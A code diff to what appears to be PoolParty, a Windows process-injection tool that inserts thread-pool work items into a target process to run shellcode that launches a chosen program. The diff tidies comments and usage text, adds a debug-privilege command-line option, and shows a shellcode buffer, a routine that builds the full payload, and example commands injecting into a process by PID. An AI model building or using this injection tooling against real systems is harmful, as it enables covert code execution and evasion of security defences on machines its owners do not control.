@@ -4,15 +4,14 @@
 #include <cstring>
 #include <boost/log/trivial.hpp>
 
-
-//This is set to release not debbugging,
-//compiling as x86 has got an error in PoolParty.cpp, i can't go far for now
+//ragma comment(lib, "libboost_log-vc143-mt-x64-1_87.lib")
+//This is set to release not debbugging
 #ifdef _WIN64
     #pragma comment(lib, "libboost_log-vc143-mt-gd-x64-1_87.lib")
 #elif defined(_WIN32)
     #pragma comment(lib, "libboost_log-vc143-mt-gd-x32-1_87.lib")
 #else
-    #error "Unknown target platform! Did you just invent a new OS?"
+    #error "Unknown target platform"
 #endif
 
 unsigned char g_BaseShellcode[] =
@@ -37,7 +36,7 @@ unsigned char g_BaseShellcode[] =
 const size_t BaseShellcodeSize = sizeof(g_BaseShellcode) - 1;
 
 unsigned char* CreateCompleteShellcode(const std::string& path, size_t& completeShellcodeSize) {
-    size_t pathLen = path.length() + 1; // Include null terminator 
+    size_t pathLen = path.length() + 1; // Include null terminator
     completeShellcodeSize = BaseShellcodeSize + pathLen;
     unsigned char* completeShellcode = new unsigned char[completeShellcodeSize];
 
@@ -61,8 +60,8 @@ void PrintUsage() {
         "#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
         "EXAMPLES:" << std::endl <<
         "------" << std::endl << std::endl <<
-        "#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234 -path C:\\Windows\\System32\\calc.exe " << std::endl << std::endl <<
-        "#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -path C:\\Users\\winner\\anyprog.exe -D" << std::endl << std::endl;
+        "#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234 -path C:\\Windows\\System32\\calc.exe" << std::endl << std::endl <<
+        "#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;
 
 }
 
@@ -86,6 +85,11 @@ POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv, std::string& path) {
         else if (CmdArg == "-path") {
             path = args.at(++i);
         }
+        else if (CmdArg == "-D" || CmdArg == "--debug-privilege")
+		{
+			CmdArgs.bDebugPrivilege = TRUE;
+			continue;
+		}
         else {
             PrintUsage();
             throw std::runtime_error("Invalid option: " + CmdArg);
